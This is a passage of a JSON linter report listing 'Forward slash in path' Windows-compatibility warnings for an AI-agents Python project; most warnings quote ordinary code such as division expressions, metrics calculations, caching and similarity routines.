        "warning": "Line 1655: Forward slash in path - \"\n        \n        # Content similarity\n        content_sim = await self._content_similarity(memory1.content, memory2.content)\n        \n        # Tag overlap\n        tag_sim = 0.0\n        if memory1.tags and memory2.tags:\n            tag_sim = len(memory1.tags & memory2.tags) / len(memory1.tags | memory2.tags)\n        \n        # Context similarity\n        context_sim = memory1._calculate_context_similarity(memory1.context, memory2.context)\n        \n        # Combined similarity\n        combined_sim = (content_sim * 0.6 + tag_sim * 0.3 + context_sim * 0.1)\n        \n        return combined_sim\n    \n    async def _content_similarity(self, content1: str, content2: str) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.301072"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\security\\autonomous_security.py",
        "warning": "Line 5: Forward slash in path - \"\n\nimport asyncio\nimport logging\nimport json\nimport hashlib\nimport hmac\nimport secrets\nfrom typing import Any, Dict, List, Optional, Set, Tuple, Union\nfrom dataclasses import dataclass, field\nfrom datetime import datetime, timedelta\nfrom enum import Enum\nfrom pathlib import Path\nimport inspect\nimport ast\nimport sys\nfrom contextlib import contextmanager\ntry:\n    import resource  # Unix/Linux only\nexcept ImportError:\n    resource = None  # Windows compatibility\nimport threading\nimport multiprocessing\n\nfrom templates.base_agent import BaseAgent\nfrom ..autonomous.safety import SafetyViolation, ViolationType\nfrom utils.observability.logging import get_logger\nfrom utils.observability.metrics import global_metrics\n\nlogger = get_logger(__name__)\n\n\nclass SecurityLevel(Enum):\n    \"",
        "timestamp": "2025-09-05T17:30:42.301691"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\security\\autonomous_security.py",
        "warning": "Line 161: Forward slash in path - \"\n        return bytes(a ^ b for a, b in zip(data, (key * (len(data) // len(key) + 1))[:len(data)]))\n\n\nclass AutonomousSecurityFramework:\n    \"",
        "timestamp": "2025-09-05T17:30:42.301757"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\security\\behavioral_monitoring.py",
        "warning": "Line 151: Forward slash in path - ', 0)\n            success_rate = successful_tasks / max(total_tasks, 1)\n            \n            # Analyze recent task patterns\n            typical_actions = {}\n            avg_duration = 0.0\n            \n            if hasattr(agent.memory, '",
        "timestamp": "2025-09-05T17:30:42.302178"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\security\\behavioral_monitoring.py",
        "warning": "Line 177: Forward slash in path - ', []))\n            modification_frequency = modification_count / max(total_tasks, 1)\n            \n            # Create/update profile\n            profile = AgentBehaviorProfile(\n                agent_name=agent_name,\n                creation_date=self.agent_profiles.get(agent_name, AgentBehaviorProfile(\n                    agent_name, datetime.now(), 0, 0, 0, {}, 0, 0, {}\n                )).creation_date,\n                total_observations=total_tasks,\n                avg_task_duration=avg_duration,\n                success_rate=success_rate,\n                typical_actions=typical_actions,\n                communication_frequency=0.0,  # Would track inter-agent communication\n                modification_frequency=modification_frequency,\n                resource_usage_patterns={}  # Would track CPU/memory usage patterns\n            )\n            \n            self.agent_profiles[agent_name] = profile\n            self.last_profile_update[agent_name] = datetime.now()\n            \n        except Exception as e:\n            logger.error(f\"",
        "timestamp": "2025-09-05T17:30:42.302209"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\security\\behavioral_monitoring.py",
        "warning": "Line 285: Forward slash in path - ', True))\n            failure_rate = recent_failures / len(recent_performance)\n            \n            if failure_rate > 0.8 and profile.success_rate > 0.5:  # Sudden high failure rate\n                anomalies.append(BehavioralAnomaly(\n                    anomaly_id=f\"",
        "timestamp": "2025-09-05T17:30:42.302276"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\security\\behavioral_monitoring.py",
        "warning": "Line 367: Forward slash in path - ': false_positives / max(total_anomalies, 1),\n            '",
        "timestamp": "2025-09-05T17:30:42.302331"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\security\\behavioral_monitoring.py",
        "warning": "Line 369: Forward slash in path - ': self.observation_window.total_seconds() / 60,\n            '",
        "timestamp": "2025-09-05T17:30:42.302343"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\security\\behavioral_monitoring.py",
        "warning": "Line 424: Forward slash in path - ']\n        \n        for feature in features:\n            values = []\n            for data in behavioral_data:\n                if feature in data and isinstance(data[feature], (int, float)):\n                    values.append(data[feature])\n            \n            if len(values) < 5:\n                continue\n            \n            # Calculate statistics\n            mean_val = statistics.mean(values)\n            stdev_val = statistics.stdev(values) if len(values) > 1 else 0\n            \n            if stdev_val == 0:\n                continue\n            \n            # Detect outliers (values > 2 standard deviations from mean)\n            threshold = 2.0\n            \n            for i, data in enumerate(behavioral_data):\n                if feature in data:\n                    value = data[feature]\n                    z_score = abs(value - mean_val) / stdev_val\n                    \n                    if z_score > threshold:\n                        anomalies.append({\n                            '",
        "timestamp": "2025-09-05T17:30:42.302389"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\security\\code_validation.py",
        "warning": "Line 559: Forward slash in path - \"\n            try:\n                # Set resource limits if available (Unix/Linux)\n                if resource:\n                    resource.setrlimit(resource.RLIMIT_CPU, (self.execution_timeout, self.execution_timeout))\n                    memory_limit = self.max_memory_mb * 1024 * 1024\n                    resource.setrlimit(resource.RLIMIT_AS, (memory_limit, memory_limit))\n                \n                # Compile code first\n                compiled_code = compile(code, f'",
        "timestamp": "2025-09-05T17:30:42.303044"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\security\\emergency_response.py",
        "warning": "Line 154: Forward slash in path - '] = (current_avg * (total_responses - 1) + response_time) / total_responses\n            \n        except Exception as e:\n            logger.error(f\"",
        "timestamp": "2025-09-05T17:30:42.303389"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\security\\emergency_response.py",
        "warning": "Line 519: Forward slash in path - \"\n        total_incidents = len(self.incident_history)\n        contained_incidents = sum(1 for inc in self.incident_history if inc.containment_applied)\n        \n        containment_success_rate = contained_incidents / max(total_incidents, 1)\n        self.response_metrics['",
        "timestamp": "2025-09-05T17:30:42.303598"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\security\\threat_detection.py",
        "warning": "Line 143: Forward slash in path - \",\n                        confidence_score=min(1.0, len(matches) / len(pattern.indicators))\n                    )\n                    threats.append(threat)\n        \n        return threats\n    \n    async def _analyze_behavioral_threats(self, behavioral_anomalies: List[BehavioralAnomaly]) -> List[SecurityThreat]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.303985"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\security\\threat_detection.py",
        "warning": "Line 410: Forward slash in path - ']\n        \n        accuracy = 1.0 - (false_pos / max(total, 1))\n        self.detection_metrics['",
        "timestamp": "2025-09-05T17:30:42.304146"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
        "warning": "Line 58: Forward slash in path - \"{self.domain}/{self.task_type}#{self.instance_id}\"",
        "timestamp": "2025-09-05T17:30:42.304975"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\services.py",
        "warning": "Line 77: Forward slash in path - \":\n                return list(self._data.keys())\n            else:\n                # Basic prefix/suffix matching\n                if pattern.endswith(\"",
        "timestamp": "2025-09-05T17:30:42.305385"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\services.py",
        "warning": "Line 184: Forward slash in path - \": sum(hist_values) / len(hist_values),\n                                \"",
        "timestamp": "2025-09-05T17:30:42.305451"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\services.py",
        "warning": "Line 192: Forward slash in path - \"\n        if not values:\n            return 0.0\n        sorted_values = sorted(values)\n        k = (len(sorted_values) - 1) * p / 100\n        f = int(k)\n        c = k - f\n        if f == len(sorted_values) - 1:\n            return sorted_values[f]\n        return sorted_values[f] * (1 - c) + sorted_values[f + 1] * c\n\n\nclass BaseConfigurationProvider(IConfigurationProvider):\n    \"",
        "timestamp": "2025-09-05T17:30:42.305467"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\security\\services\\security_service.py",
        "warning": "Line 493: Forward slash in path - \"\n        if agent_id not in self._behavior_patterns:\n            return 0.5  # Neutral score for unknown agents\n        \n        pattern = self._behavior_patterns[agent_id]\n        \n        # Check frequency anomaly\n        current_frequency = len(recent_events)\n        frequency_anomaly = abs(current_frequency - pattern.frequency) / max(pattern.frequency, 1)\n        \n        # Check time anomaly\n        current_time = datetime.utcnow().strftime(\"",
        "timestamp": "2025-09-05T17:30:42.306957"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\security\\services\\security_service.py",
        "warning": "Line 504: Forward slash in path - \")\n        time_anomaly = 0.0 if current_time in pattern.typical_times else 0.3\n        \n        # Check operation anomaly\n        recent_operations = {e.description for e in recent_events}\n        operation_anomaly = len(recent_operations - pattern.typical_operations) / max(len(recent_operations), 1)\n        \n        # Weighted average\n        anomaly_score = (frequency_anomaly * 0.4 + time_anomaly * 0.3 + operation_anomaly * 0.3)\n        return min(1.0, anomaly_score)\n    \n    def _assess_risk_level(self, anomaly_score: float) -> str:\n        \"",
        "timestamp": "2025-09-05T17:30:42.306982"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\security\\services\\security_service.py",
        "warning": "Line 538: Forward slash in path - \"\n        if self._operations_count == 0:\n            return 100.0\n        \n        # Base score\n        blocked_ratio = self._blocked_operations / self._operations_count\n        base_score = max(0, 100 - (blocked_ratio * 50))\n        \n        # Adjust for recent threats\n        recent_threats = len([e for e in self._security_events \n                            if e.threat_level.value >= ThreatLevel.MEDIUM.value and\n                            e.timestamp > datetime.utcnow() - timedelta(hours=24)])\n        \n        threat_penalty = min(30, recent_threats * 5)\n        \n        return max(0, base_score - threat_penalty)\n    \n    async def _background_monitoring(self) -> None:\n        \"",
        "timestamp": "2025-09-05T17:30:42.307016"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\services\\reasoning_service.py",
        "warning": "Line 280: Forward slash in path - \"\n        # Weighted combination based on confidence\n        w1 = result1.confidence\n        w2 = result2.confidence\n        total_weight = w1 + w2\n        \n        if total_weight == 0:\n            combined_confidence = 0.5\n        else:\n            combined_confidence = (w1 + w2) / 2\n        \n        return ReasoningResult(\n            solution=f\"",
        "timestamp": "2025-09-05T17:30:42.308485"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\services\\reasoning_service.py",
        "warning": "Line 301: Forward slash in path - \")\n        \n        if len(results) == 1:\n            return results[0]\n        \n        # Weighted voting based on confidence\n        total_weight = sum(r.confidence for r in results)\n        \n        if total_weight == 0:\n            # Equal weighting if no confidence information\n            weights = [1.0 / len(results) for _ in results]\n        else:\n            weights = [r.confidence / total_weight for r in results]\n        \n        # Select solution with highest weighted confidence\n        best_idx = max(range(len(results)), key=lambda i: results[i].confidence)\n        best_result = results[best_idx]\n        \n        # Combine reasoning chains and alternatives\n        all_chains = []\n        all_alternatives = []\n        \n        for result in results:\n            all_chains.extend(result.reasoning_chain)\n            all_alternatives.extend(result.alternative_solutions)\n        \n        # Add other solutions as alternatives\n        alternatives = [r.solution for r in results if r != best_result]\n        all_alternatives.extend(alternatives)\n        \n        return ReasoningResult(\n            solution=best_result.solution,\n            confidence=sum(w * r.confidence for w, r in zip(weights, results)),\n            reasoning_chain=list(set(all_chains)),  # Remove duplicates\n            alternative_solutions=list(set(all_alternatives))  # Remove duplicates\n        )\n    \n    def _get_cache_key(self, request: ReasoningRequest) -> str:\n        \"",
        "timestamp": "2025-09-05T17:30:42.308523"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\services\\reasoning_service.py",
        "warning": "Line 356: Forward slash in path - \"] * (n - 1) + result.confidence) / n\n            )\n            metrics[\"",
        "timestamp": "2025-09-05T17:30:42.308545"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\services\\reasoning_service.py",
        "warning": "Line 359: Forward slash in path - \"] * (n - 1) + execution_time) / n\n            )\n    \n    async def get_performance_metrics(self) -> Dict[str, Any]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.308558"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\caching\\redis_cache.py",
        "warning": "Line 34: Forward slash in path - \"\n        if self.total_requests == 0:\n            return 0.0\n        return self.hits / self.total_requests * 100.0\n\n\nclass RedisCache:\n    \"",
        "timestamp": "2025-09-05T17:30:42.309043"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\caching\\redis_cache.py",
        "warning": "Line 47: Forward slash in path - \"redis://localhost:6379\"",
        "timestamp": "2025-09-05T17:30:42.309052"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\caching\\redis_cache.py",
        "warning": "Line 307: Forward slash in path - \"{self.stats.total_requests / max(1, uptime):.2f}\"",
        "timestamp": "2025-09-05T17:30:42.309192"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\caching\\redis_cache.py",
        "warning": "Line 361: Forward slash in path - \"redis://localhost:6379\"",
        "timestamp": "2025-09-05T17:30:42.309224"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\optimization\\algorithm_optimizer.py",
        "warning": "Line 53: Forward slash in path - \"{self.execution_time_before/self.execution_time_after:.2f}x\"",
        "timestamp": "2025-09-05T17:30:42.309779"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\optimization\\algorithm_optimizer.py",
        "warning": "Line 54: Forward slash in path - \"{(1 - self.memory_usage_after/max(1, self.memory_usage_before))*100:.1f}%\"",
        "timestamp": "2025-09-05T17:30:42.309788"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\optimization\\algorithm_optimizer.py",
        "warning": "Line 103: Forward slash in path - \"O(n²) bubble/insertion sort\"",
        "timestamp": "2025-09-05T17:30:42.309819"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\optimization\\algorithm_optimizer.py",
        "warning": "Line 104: Forward slash in path - \",\n            len(data) / max(1, execution_time * 1000),  # Approximate improvement\n            0.0,  # Would need baseline\n            execution_time,\n            optimization_technique=\"",
        "timestamp": "2025-09-05T17:30:42.309829"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\optimization\\algorithm_optimizer.py",
        "warning": "Line 117: Forward slash in path - \"\n        if k <= 0:\n            return []\n        if k >= len(data):\n            return self.optimized_sort(data, key=key)\n        \n        start_time = time.perf_counter()\n        \n        if key:\n            # Use nlargest/nsmallest for efficient partial sorting\n            result = heapq.nlargest(k, data, key=key)\n        else:\n            result = heapq.nlargest(k, data)\n        \n        execution_time = time.perf_counter() - start_time\n        \n        self._record_optimization(\n            AlgorithmType.SORTING,\n            \"",
        "timestamp": "2025-09-05T17:30:42.309847"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\optimization\\algorithm_optimizer.py",
        "warning": "Line 136: Forward slash in path - \",\n            len(data) / max(1, k * execution_time * 1000),\n            0.0,\n            execution_time,\n            optimization_technique=\"",
        "timestamp": "2025-09-05T17:30:42.309855"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\optimization\\algorithm_optimizer.py",
        "warning": "Line 148: Forward slash in path - \"\n        Search for multiple targets efficiently using set/dict lookup\n        Complexity: O(n + m) instead of O(n * m)\n        \"",
        "timestamp": "2025-09-05T17:30:42.309866"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\optimization\\algorithm_optimizer.py",
        "warning": "Line 170: Forward slash in path - \",\n            (len(data) * len(targets)) / max(1, (len(data) + len(targets)) * execution_time * 1000),\n            0.0,\n            execution_time,\n            optimization_technique=\"",
        "timestamp": "2025-09-05T17:30:42.309884"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\optimization\\algorithm_optimizer.py",
        "warning": "Line 199: Forward slash in path - \",\n            len(sorted_data) / max(1, (len(result_indices) + 1) * execution_time * 1000),\n            0.0,\n            execution_time,\n            optimization_technique=\"",
        "timestamp": "2025-09-05T17:30:42.309903"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\optimization\\algorithm_optimizer.py",
        "warning": "Line 241: Forward slash in path - ':\n                            group_result[agg_name] = sum(values) / len(values)\n                        elif agg_name == '",
        "timestamp": "2025-09-05T17:30:42.309933"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\optimization\\algorithm_optimizer.py",
        "warning": "Line 261: Forward slash in path - \",\n            len(data) / max(1, execution_time * 1000),\n            0.0,\n            execution_time,\n            optimization_technique=\"",
        "timestamp": "2025-09-05T17:30:42.309952"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\optimization\\algorithm_optimizer.py",
        "warning": "Line 301: Forward slash in path - ':\n                current_sum += value\n                \n                while len(window) > window_size:\n                    old_value = window.popleft()\n                    current_sum -= old_value\n                \n                if len(window) == window_size:\n                    results.append(current_sum / window_size)\n            \n            elif agg_func in ['",
        "timestamp": "2025-09-05T17:30:42.309979"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\optimization\\algorithm_optimizer.py",
        "warning": "Line 311: Forward slash in path - ']:\n                # For min/max, need to track window contents\n                while len(window) > window_size:\n                    window.popleft()\n                \n                if len(window) == window_size:\n                    if agg_func == '",
        "timestamp": "2025-09-05T17:30:42.310005"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\optimization\\algorithm_optimizer.py",
        "warning": "Line 327: Forward slash in path - \",\n            len(data) * window_size / max(1, len(data) * execution_time * 1000),\n            0.0,\n            execution_time,\n            optimization_technique=\"",
        "timestamp": "2025-09-05T17:30:42.310022"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\optimization\\algorithm_optimizer.py",
        "warning": "Line 369: Forward slash in path - \",\n            len(data) ** 2 / max(1, len(data) * execution_time * 1000),\n            0.0,\n            execution_time,\n            optimization_technique=\"",
        "timestamp": "2025-09-05T17:30:42.310050"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\optimization\\algorithm_optimizer.py",
        "warning": "Line 379: Forward slash in path - \"\n        Find similar items efficiently using MinHash/LSH approximation\n        Complexity: O(n * k) instead of O(n²) where k << n\n        \"",
        "timestamp": "2025-09-05T17:30:42.310066"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\optimization\\algorithm_optimizer.py",
        "warning": "Line 382: Forward slash in path - \"\n        start_time = time.perf_counter()\n        \n        if len(items) < 2:\n            return []\n        \n        # Simple character-based similarity (can be enhanced with MinHash)\n        def simple_similarity(s1: str, s2: str) -> float:\n            if not s1 or not s2:\n                return 0.0\n            \n            # Jaccard similarity on character trigrams\n            trigrams1 = set(s1[i:i+3] for i in range(len(s1)-2)) if len(s1) >= 3 else set([s1])\n            trigrams2 = set(s2[i:i+3] for i in range(len(s2)-2)) if len(s2) >= 3 else set([s2])\n            \n            if not trigrams1 and not trigrams2:\n                return 1.0\n            if not trigrams1 or not trigrams2:\n                return 0.0\n            \n            intersection = len(trigrams1 & trigrams2)\n            union = len(trigrams1 | trigrams2)\n            \n            return intersection / union if union > 0 else 0.0\n        \n        # Use locality-sensitive hashing approximation\n        similar_pairs = []\n        \n        # Group items by first few characters for rough bucketing\n        buckets = defaultdict(list)\n        for item in items:\n            bucket_key = item[:3].lower() if len(item) >= 3 else item.lower()\n            buckets[bucket_key].append(item)\n        \n        # Only compare items in same or similar buckets\n        for bucket_items in buckets.values():\n            if len(bucket_items) < 2:\n                continue\n                \n            for i in range(len(bucket_items)):\n                for j in range(i + 1, len(bucket_items)):\n                    similarity = simple_similarity(bucket_items[i], bucket_items[j])\n                    if similarity >= similarity_threshold:\n                        similar_pairs.append((bucket_items[i], bucket_items[j], similarity))\n        \n        execution_time = time.perf_counter() - start_time\n        \n        self._record_optimization(\n            AlgorithmType.PATTERN_MATCHING,\n            \"",
        "timestamp": "2025-09-05T17:30:42.310104"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\optimization\\algorithm_optimizer.py",
        "warning": "Line 432: Forward slash in path - \",\n            len(items) ** 2 / max(1, len(items) * execution_time * 1000),\n            0.0,\n            execution_time,\n            optimization_technique=\"",
        "timestamp": "2025-09-05T17:30:42.310124"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\optimization\\algorithm_optimizer.py",
        "warning": "Line 488: Forward slash in path - \",\n            len(graph) ** 3 / max(1, len(start_nodes) * len(graph) * execution_time * 1000),\n            0.0,\n            execution_time,\n            optimization_technique=\"",
        "timestamp": "2025-09-05T17:30:42.310177"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\optimization\\algorithm_optimizer.py",
        "warning": "Line 529: Forward slash in path - \",\n            len(graph) ** 2 / max(1, (len(graph) + sum(len(neighbors) for neighbors in graph.values())) * execution_time * 1000),\n            0.0,\n            execution_time,\n            optimization_technique=\"",
        "timestamp": "2025-09-05T17:30:42.310241"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\optimization\\algorithm_optimizer.py",
        "warning": "Line 587: Forward slash in path - \",\n            len(text) * len(pattern) / max(1, (len(text) + len(pattern)) * execution_time * 1000),\n            0.0,\n            execution_time,\n            optimization_technique=\"",
        "timestamp": "2025-09-05T17:30:42.310305"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\optimization\\algorithm_optimizer.py",
        "warning": "Line 600: Forward slash in path - \"\n        start_time = time.perf_counter()\n        \n        if len(texts) <= max_clusters:\n            return {i: [text] for i, text in enumerate(texts)}\n        \n        # Simple TF-IDF vectorization\n        from collections import Counter\n        import math\n        \n        # Tokenize and count terms\n        all_terms = set()\n        doc_terms = []\n        \n        for text in texts:\n            terms = text.lower().split()\n            doc_terms.append(Counter(terms))\n            all_terms.update(terms)\n        \n        # Calculate TF-IDF vectors (simplified)\n        term_list = list(all_terms)\n        term_to_idx = {term: i for i, term in enumerate(term_list)}\n        \n        vectors = []\n        for doc_term_count in doc_terms:\n            vector = [0.0] * len(term_list)\n            doc_length = sum(doc_term_count.values())\n            \n            for term, count in doc_term_count.items():\n                tf = count / doc_length if doc_length > 0 else 0\n                # Simple IDF approximation\n                idf = math.log(len(texts) / (1 + sum(1 for dt in doc_terms if term in dt)))\n                vector[term_to_idx[term]] = tf * idf\n            \n            vectors.append(vector)\n        \n        # Simple k-means clustering\n        def cosine_similarity(v1, v2):\n            dot_product = sum(a * b for a, b in zip(v1, v2))\n            norm1 = sum(a * a for a in v1) ** 0.5\n            norm2 = sum(b * b for b in v2) ** 0.5\n            if norm1 == 0 or norm2 == 0:\n                return 0\n            return dot_product / (norm1 * norm2)\n        \n        # Initialize centroids randomly\n        import random\n        centroids = random.sample(vectors, min(max_clusters, len(vectors)))\n        \n        # Simple clustering iterations\n        for _ in range(10):  # Max 10 iterations\n            clusters = defaultdict(list)\n            \n            for i, vector in enumerate(vectors):\n                # Find closest centroid\n                best_cluster = 0\n                best_similarity = -1\n                \n                for j, centroid in enumerate(centroids):\n                    similarity = cosine_similarity(vector, centroid)\n                    if similarity > best_similarity:\n                        best_similarity = similarity\n                        best_cluster = j\n                \n                clusters[best_cluster].append(i)\n            \n            # Update centroids\n            new_centroids = []\n            for cluster_id in range(len(centroids)):\n                if cluster_id in clusters and clusters[cluster_id]:\n                    # Average of cluster vectors\n                    cluster_vectors = [vectors[i] for i in clusters[cluster_id]]\n                    centroid = [sum(values) / len(cluster_vectors) \n                               for values in zip(*cluster_vectors)]\n                    new_centroids.append(centroid)\n                else:\n                    new_centroids.append(centroids[cluster_id])\n            \n            centroids = new_centroids\n        \n        # Final clustering\n        final_clusters = defaultdict(list)\n        for i, vector in enumerate(vectors):\n            best_cluster = 0\n            best_similarity = -1\n            \n            for j, centroid in enumerate(centroids):\n                similarity = cosine_similarity(vector, centroid)\n                if similarity > best_similarity:\n                    best_similarity = similarity\n                    best_cluster = j\n            \n            final_clusters[best_cluster].append(texts[i])\n        \n        execution_time = time.perf_counter() - start_time\n        \n        self._record_optimization(\n            AlgorithmType.CLUSTERING,\n            \"",
        "timestamp": "2025-09-05T17:30:42.310380"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\optimization\\algorithm_optimizer.py",
        "warning": "Line 699: Forward slash in path - \",\n            len(texts) ** 2 / max(1, len(texts) * len(term_list) * max_clusters * execution_time * 1000),\n            0.0,\n            execution_time,\n            optimization_technique=\"",
        "timestamp": "2025-09-05T17:30:42.310412"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\optimization\\algorithm_optimizer.py",
        "warning": "Line 735: Forward slash in path - ': {}}\n        \n        by_type = defaultdict(list)\n        total_improvement = 1.0\n        \n        for opt in self.optimizations_applied:\n            by_type[opt.algorithm_type.value].append(opt)\n            total_improvement *= opt.performance_improvement\n        \n        type_summaries = {}\n        for opt_type, opts in by_type.items():\n            avg_improvement = sum(opt.performance_improvement for opt in opts) / len(opts)\n            type_summaries[opt_type] = {\n                '",
        "timestamp": "2025-09-05T17:30:42.310479"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\optimization\\algorithm_optimizer.py",
        "warning": "Line 764: Forward slash in path - \"\n        \n        import time\n        import tracemalloc\n        \n        # Benchmark original function\n        tracemalloc.start()\n        original_times = []\n        \n        for _ in range(iterations):\n            start_time = time.perf_counter()\n            original_func(test_data)\n            end_time = time.perf_counter()\n            original_times.append(end_time - start_time)\n        \n        original_memory = tracemalloc.get_traced_memory()[1]\n        tracemalloc.stop()\n        \n        # Benchmark optimized function\n        tracemalloc.start()\n        optimized_times = []\n        \n        for _ in range(iterations):\n            start_time = time.perf_counter()\n            optimized_func(test_data)\n            end_time = time.perf_counter()\n            optimized_times.append(end_time - start_time)\n        \n        optimized_memory = tracemalloc.get_traced_memory()[1]\n        tracemalloc.stop()\n        \n        # Calculate statistics\n        original_avg = sum(original_times) / len(original_times)\n        optimized_avg = sum(optimized_times) / len(optimized_times)\n        \n        speed_improvement = original_avg / optimized_avg if optimized_avg > 0 else float('",
        "timestamp": "2025-09-05T17:30:42.310541"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\optimization\\algorithm_optimizer.py",
